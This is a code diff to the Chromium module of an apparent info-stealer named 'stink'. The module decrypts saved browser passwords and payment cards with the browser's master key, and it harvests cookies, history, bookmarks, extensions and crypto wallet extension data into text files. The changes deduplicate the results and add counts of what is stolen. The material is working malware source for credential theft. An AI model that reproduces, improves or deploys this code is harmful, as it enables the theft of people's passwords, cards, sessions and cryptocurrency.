@@ -8,6 +8,7 @@ from sqlite3 import connect, Connection, Cursor
 from ctypes import windll, byref, cdll, c_buffer
 from subprocess import run, CREATE_NEW_CONSOLE, SW_HIDE
 
+from stink.helpers.dataclasses import Data
 from stink.enums.features import Features
 from stink.helpers.config import ChromiumConfig
 from stink.helpers import AESModeOfOperationGCM, DataBlob, MemoryStorage
@@ -214,15 +215,17 @@ class Chromium:
             return
 
         data = self.__config.PasswordsData
-        temp = [
+        temp = set([
             data.format(result[0], result[1], self._decrypt(result[2], self.__master_key))
             for result in passwords_list
-        ]
+        ])
 
         self.__storage.add_from_memory(
             path.join(self.__path, rf"{profile} Passwords.txt"),
-            "".join(item for item in set(temp))
+            "".join(item for item in temp)
         )
+
+        self.__storage.add_data("Passwords", len(temp))
 
     def _grab_cookies(self, profile: str, file_path: str) -> None:
         """
@@ -263,6 +266,8 @@ class Chromium:
             "\n".join(row for row in temp)
         )
 
+        self.__storage.add_data("Cookies", len(temp))
+
     def _grab_cards(self, profile: str, file_path: str) -> None:
         """
         Collects browser cards.
@@ -290,15 +295,17 @@ class Chromium:
             return
 
         data = self.__config.CardsData
-        temp = [
+        temp = set([
             data.format(result[0], self._decrypt(result[3], self.__master_key), result[1], result[2])
             for result in cards_list
-        ]
+        ])
 
         self.__storage.add_from_memory(
             path.join(self.__path, rf"{profile} Cards.txt"),
-            "".join(item for item in set(temp))
+            "".join(item for item in temp)
         )
+
+        self.__storage.add_data("Cards", len(temp))
 
     def _grab_history(self, profile: str, file_path: str) -> None:
         """
@@ -328,15 +335,17 @@ class Chromium:
             return
 
         data = self.__config.HistoryData
-        temp = [
+        temp = set([
             data.format(result[0], result[1], self._get_datetime(result[2]))
             for result in history_list
-        ]
+        ])
 
         self.__storage.add_from_memory(
             path.join(self.__path, rf"{profile} History.txt"),
-            "".join(item for item in set(temp))
+            "".join(item for item in temp)
         )
+
+        self.__storage.add_data("History", len(temp))
 
     def _grab_bookmarks(self, profile: str, file_path: str) -> None:
         """
@@ -362,15 +371,17 @@ class Chromium:
             return
 
         data = self.__config.BookmarksData
-        temp = [
+        temp = set([
             data.format(result[0], result[1])
             for result in bookmarks_list
-        ]
+        ])
 
         self.__storage.add_from_memory(
             path.join(self.__path, rf"{profile} Bookmarks.txt"),
-            "".join(item for item in set(temp))
+            "".join(item for item in temp)
         )
+
+        self.__storage.add_data("Bookmarks", len(temp))
 
     def _grab_extensions(self, profile: str, extensions_path: str) -> None:
         """
@@ -413,10 +424,14 @@ class Chromium:
 
             file.close()
 
+        extensions_set = set(extensions_list)
+
         self.__storage.add_from_memory(
             path.join(self.__path, rf"{profile} Extensions.txt"),
-            "\n".join(item for item in set(extensions_list))
+            "\n".join(item for item in extensions_set)
         )
+
+        self.__storage.add_data("Extensions", len(extensions_set))
 
     def _grab_wallets(self, profile: str, wallets: str) -> None:
         """
@@ -447,6 +462,8 @@ class Chromium:
                         extension_path,
                         path.join("Wallets", rf'{self.__browser_name} {profile} {wallet["name"]}')
                     )
+
+                    self.__storage.add_data("Wallets", wallet["name"])
 
                 except Exception as e:
                     print(f"[{self.__browser_name}]: {repr(e)}")
@@ -531,7 +548,7 @@ class Chromium:
         for profile in self.__profiles:
             self._process_profile(profile)
 
-    def run(self) -> List:
+    def run(self) -> Data:
         """
         Launches the browser data collection module.
 
